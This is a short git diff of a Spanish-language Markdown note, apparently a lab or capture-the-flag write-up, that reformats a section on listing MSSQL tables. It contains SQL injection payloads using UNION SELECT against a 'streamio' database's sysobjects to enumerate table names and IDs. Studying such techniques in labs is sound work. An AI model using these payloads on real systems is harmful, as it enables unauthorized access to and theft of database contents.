@@ -189,9 +189,11 @@ recordemos que podemos interactuar bajo la posición numero 2 y 3 en este caso y
 ### MSSQL List Tables
 de esta manera usando la query hemos logrado enumerar el nombre de las tablas en la base de datos
 ```python 
-10' union select 1,name,3,4,5,6 FROM streamio..sysobjects WHERE xtype = 'U';-- -
-------------------------------------------------------------------------------------------------------------------------------
-`utilizando el campo numero 3 podemos preguntar por el ID de la tablas para poder localizar el identificador especifico`
-10' union select 1,name,id,4,5,6 FROM streamio..sysobjects WHERE xtype = 'U';-- - 
+10' union select 1,name,3,4,5,6 FROM streamio..sysobjects WHERE xtype = 'U';-- - 
 ```
 ![[Pasted image 20240514145530.png]]
+
+``utilizando el campo numero 3 podemos preguntar por el ID de la tablas para poder localizar el identificador especifico``
+```python
+10' union select 1,name,id,4,5,6 FROM streamio..sysobjects WHERE xtype = 'U';-- -
+```
